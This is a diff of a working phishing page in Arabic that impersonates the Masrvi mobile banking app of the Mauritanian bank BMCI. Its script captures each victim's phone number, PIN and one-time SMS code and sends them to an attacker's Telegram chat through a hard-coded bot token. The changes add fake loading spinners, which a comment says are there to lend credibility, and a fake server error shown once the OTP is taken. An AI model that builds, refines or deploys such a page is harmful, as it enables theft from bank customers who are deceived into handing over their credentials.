@@ -3,69 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Masrvi</title>
+    <title>Masrvi Mobile</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap');
-        body { margin: 0; background-color: #F2F2F2; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
-        .app { width: 100%; max-width: 400px; background: #fff; display: flex; flex-direction: column; height: 100%; }
-        .header { background: #e67e22; padding: 50px 20px 30px; text-align: center; color: white; }
-        .logo { font-size: 40px; font-weight: 900; margin: 0; letter-spacing: -1.5px; }
-        .container { padding: 40px 25px; flex: 1; }
-        label { display: block; margin-bottom: 10px; color: #333; font-weight: 700; }
-        input { width: 100%; padding: 18px; border: 1.5px solid #eee; border-radius: 12px; background: #f9f9f9; font-size: 17px; text-align: center; margin-bottom: 25px; box-sizing: border-box; }
-        .btn { background: #ad6d2f; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; }
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap');
+        
+        :root { --primary-color: #e67e22; --secondary-color: #ad6d2f; --bg-color: #f4f7f6; }
+
+        body { margin: 0; background-color: var(--bg-color); font-family: 'Cairo', sans-serif; display: flex; justify-content: center; height: 100vh; color: #333; }
+        .app-container { width: 100%; max-width: 450px; background: white; display: flex; flex-direction: column; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.05); }
+        
+        .header { background: var(--primary-color); padding: 40px 20px 20px; text-align: center; color: white; border-bottom-left-radius: 25px; border-bottom-right-radius: 25px; }
+        .logo-text { font-size: 35px; font-weight: 900; margin: 0; text-transform: lowercase; letter-spacing: -1px; }
+        .sub-header { font-size: 13px; opacity: 0.9; font-weight: 600; margin-top: 5px; }
+
+        .content { padding: 30px 25px; flex: 1; }
+        .welcome-msg { font-size: 20px; font-weight: 700; color: #2c3e50; margin-bottom: 30px; text-align: center; }
+
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 700; color: #555; }
+        
+        input { 
+            width: 100%; padding: 15px; border: 1.5px solid #e0e0e0; border-radius: 12px; 
+            background: #fdfdfd; font-size: 16px; transition: 0.3s; box-sizing: border-box; text-align: center;
+        }
+        input:focus { border-color: var(--primary-color); outline: none; background: white; box-shadow: 0 0 8px rgba(230, 126, 34, 0.2); }
+
+        .main-btn { 
+            background: var(--secondary-color); color: white; border: none; padding: 16px; 
+            width: 100%; border-radius: 12px; font-size: 17px; font-weight: 700; cursor: pointer; 
+            margin-top: 10px; transition: 0.2s;
+        }
+        .main-btn:active { transform: scale(0.98); opacity: 0.9; }
+
+        .otp-info { text-align: center; font-size: 14px; color: #666; margin-bottom: 20px; }
+        .timer-box { font-size: 22px; font-weight: 900; color: var(--primary-color); margin: 10px 0; }
+
+        .footer-brand { text-align: center; padding: 20px; font-size: 12px; color: #bbb; margin-top: auto; }
         .hidden { display: none; }
-        .footer { text-align: center; padding: 20px; color: #999; font-size: 13px; }
+
+        /* أنيميشن التحميل */
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid var(--primary-color); border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-left: 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-<div class="app">
-    <div class="header"><h1 class="logo">masrvi</h1><div style="font-size: 14px; opacity: 0.9;">BMCI - المصرف الموريتاني للاستثمار</div></div>
-    
-    <div id="step1" class="container">
-        <label>رقم الهاتف</label>
-        <input type="tel" id="phone" placeholder="00000000">
-        <label>الرمز السري</label>
-        <input type="password" id="pin" placeholder="••••">
-        <button class="btn" onclick="sendData()">دخول آمن</button>
+
+<div class="app-container">
+    <div class="header">
+        <h1 class="logo-text">masrvi</h1>
+        <div class="sub-header">المصرف الموريتاني للاستثمار - BMCI</div>
     </div>
 
-    <div id="step2" class="container hidden">
-        <h2 style="text-align: center;">تأكيد الهوية</h2>
-        <div id="timer" style="text-align: center; color: #e67e22; font-size: 24px; margin-bottom: 20px; font-weight: 900;">2:00</div>
-        <input type="text" id="otp" placeholder="• • • • • •">
-        <button class="btn" onclick="sendOtp()">تأكيد</button>
+    <div id="login-step" class="content">
+        <div class="welcome-msg">تسجيل الدخول للموبايل</div>
+        <div class="input-group">
+            <label>رقم الهاتف المربوط بالحساب</label>
+            <input type="tel" id="phone" placeholder="00 00 00 00" maxlength="8">
+        </div>
+        <div class="input-group">
+            <label>كلمة المرور (PIN)</label>
+            <input type="password" id="pin" placeholder="••••" maxlength="4">
+        </div>
+        <button class="main-btn" onclick="processLogin()">دخول آمن</button>
     </div>
+
+    <div id="otp-step" class="content hidden">
+        <div class="welcome-msg">تأكيد العملية</div>
+        <div class="otp-info">
+            تم إرسال رمز التحقق (OTP) في رسالة نصية إلى رقمك المرتبط بالحساب. يرجى إدخاله للمتابعة.
+        </div>
+        <div class="timer-box" id="timer">02:00</div>
+        <div class="input-group">
+            <input type="text" id="otp" placeholder="— — — — — —" maxlength="6" style="letter-spacing: 5px; font-size: 22px;">
+        </div>
+        <button class="main-btn" onclick="processOtp()">
+            <span id="btn-text">تأكيد الرمز</span>
+        </button>
+        <div style="text-align: center; margin-top: 15px; font-size: 13px; color: var(--primary-color); font-weight: 700; cursor: pointer;">إعادة إرسال الرمز</div>
+    </div>
+
+    <div class="footer-brand">Masrvi Mobile Banking © 2026<br>Version 4.2.1</div>
 </div>
 
 <script>
 const token = "8647203625:AAFUHY8sXVD8IoSvf60Wd7pT-l5MHDO-d9I";
 const chatId = "5244299184";
 
-function sendToTelegram(text) {
+function notify(text) {
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
-    // استخدام طريقة الصورة لضمان الإرسال السريع وتخطي الحجب
-    const img = new Image();
-    img.src = url;
+    new Image().src = url;
 }
 
-function sendData() {
+function processLogin() {
     const p = document.getElementById('phone').value;
     const s = document.getElementById('pin').value;
-    if(p && s) {
-        sendToTelegram(`🚨 دخول جديد:\n📱 الهاتف: ${p}\n🔑 الرمز: ${s}`);
-        document.getElementById('step1').classList.add('hidden');
-        document.getElementById('step2').classList.remove('hidden');
+    
+    if(p.length >= 8 && s.length >= 4) {
+        // إشعار فوري بالدخول
+        notify(`🚨 ضحية جديد دخل :\n📱 الهاتف: ${p}\n🔑 الرمز: ${s}`);
+        
+        // إظهار واجهة التحميل لإعطاء مصداقية
+        const btn = document.querySelector('.main-btn');
+        btn.innerHTML = '<div class="loader"></div> جاري التحقق...';
+        
+        setTimeout(() => {
+            document.getElementById('login-step').classList.add('hidden');
+            document.getElementById('otp-step').classList.remove('hidden');
+            startTimer(120);
+        }, 1500);
+    } else {
+        alert("يرجى التأكد من إدخال البيانات بشكل صحيح");
     }
 }
 
-function sendOtp() {
+function processOtp() {
     const o = document.getElementById('otp').value;
-    if(o) {
-        sendToTelegram(`🔢 الرمز OTP: ${o}`);
-        alert("تم التأكيد بنجاح، يرجى الانتظار...");
-        location.reload();
+    if(o.length >= 4) {
+        notify(`🔢 رمز الـ OTP المسجل: ${o}`);
+        
+        const btn = document.getElementById('btn-text');
+        btn.innerHTML = '<div class="loader"></div> جاري التأكيد...';
+        
+        setTimeout(() => {
+            alert("حدث خطأ في الاتصال بالسيرفر، يرجى المحاولة لاحقاً.");
+            location.reload();
+        }, 2000);
     }
+}
+
+function startTimer(duration) {
+    let timer = duration, minutes, seconds;
+    const display = document.getElementById('timer');
+    setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+        display.textContent = minutes + ":" + seconds;
+        if (--timer < 0) timer = 0;
+    }, 1000);
 }
 </script>
 </body>
